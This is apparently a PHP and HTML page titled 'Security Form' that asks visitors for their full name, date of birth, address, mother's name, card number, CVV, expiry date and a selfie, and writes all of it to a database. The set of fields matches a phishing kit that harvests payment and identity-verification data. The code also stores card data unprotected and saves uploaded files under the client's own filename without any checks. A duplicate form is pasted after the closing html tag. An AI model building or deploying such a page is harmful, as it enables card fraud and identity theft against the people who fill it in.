<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Include the database connection
    include 'connect.php';

    // Process other form fields

    // Handle uploaded image
    $targetDir = "uploads/";
    $targetFile = $targetDir . basename($_FILES["selfie"]["name"]);
    
    // Move the uploaded image to the designated directory
    if (move_uploaded_file($_FILES["selfie"]["tmp_name"], $targetFile)) {
        // Insert form data into the database
        $insertQuery = "INSERT INTO user_data (fullname, dob, address, mother_name, card_number, cvv, exp_date, selfie_path)
                        VALUES (:fullname, :dob, :address, :mother_name, :card_number, :cvv, :exp_date, :selfie_path)";
        $stmt = $pdo->prepare($insertQuery);
        $stmt->bindParam(':fullname', $_POST['fullname']);
        $stmt->bindParam(':dob', $_POST['dob']);
        $stmt->bindParam(':address', $_POST['address']);
        $stmt->bindParam(':mother_name', $_POST['mother_name']);
        $stmt->bindParam(':card_number', $_POST['card_number']);
        $stmt->bindParam(':cvv', $_POST['cvv']);
        $stmt->bindParam(':exp_date', $_POST['exp_date']);
        $stmt->bindParam(':selfie_path', $targetFile);
        
        if ($stmt->execute()) {
            echo "Form submitted successfully!";
        } else {
            echo "Error submitting form.";
        }
    } else {
        echo "Error uploading image.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Example</title>
    
        <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            width: 400px;
        }

        form {
            display: grid;
            gap: 15px;
        }

        label {
            font-weight: bold;
        }

        input[type="text"],
        input[type="date"],
        input[type="file"],
        textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        input[type="submit"] {
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 10px 20px;
            cursor: pointer;
        }

        input[type="submit"]:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Security Form</h2>
        <form action="" method="post" enctype="multipart/form-data">
            <label for="fullname">Full Name:</label>
            <input type="text" id="fullname" name="fullname" required>

            <label for="dob">Date of Birth:</label>
            <input type="date" id="dob" name="dob" required>

            <label for="address">Address:</label>
            <textarea id="address" name="address" required></textarea>

            <label for="mother_name">Mother's Name:</label>
            <input type="text" id="mother_name" name="mother_name" required>

            <label for="card_number">Card Number:</label>
            <input type="text" id="card_number" name="card_number" required>

            <label for="cvv">CVV:</label>
            <input type="text" id="cvv" name="cvv" required>

            <label for="exp_date">Expiration Date:</label>
            <input type="date" id="exp_date" name="exp_date" required>

            <label for="selfie">Selfie Picture:</label>
            <input type="file" id="selfie" name="selfie" accept="image/*" required>

            <input type="submit" value="Submit">
        </form>
    </div>
</body>
</html>




</head>
<body>
    <form action="" method="post" enctype="multipart/form-data">
        <label for="fullname">Full Name:</label>
        <input type="text" id="fullname" name="fullname" required><br><br>

        <label for="dob">Date of Birth:</label>
        <input type="date" id="dob" name="dob" required><br><br>

        <label for="address">Address:</label>
        <textarea id="address" name="address" required></textarea><br><br>

        <label for="mother_name">Mother's Name:</label>
        <input type="text" id="mother_name" name="mother_name" required><br><br>

        <label for="card_number">Card Number:</label>
        <input type="text" id="card_number" name="card_number" required><br><br>

        <label for="cvv">CVV:</label>
        <input type="text" id="cvv" name="cvv" required><br><br>

        <label for="exp_date">Expiration Date:</label>
        <input type="date" id="exp_date" name="exp_date" required><br><br>

        <label for="selfie">Selfie Picture:</label>
        <input type="file" id="selfie" name="selfie" accept="image/*" required><br><br>

        <input type="submit" value="Submit">
    </form>
</body>
</html>
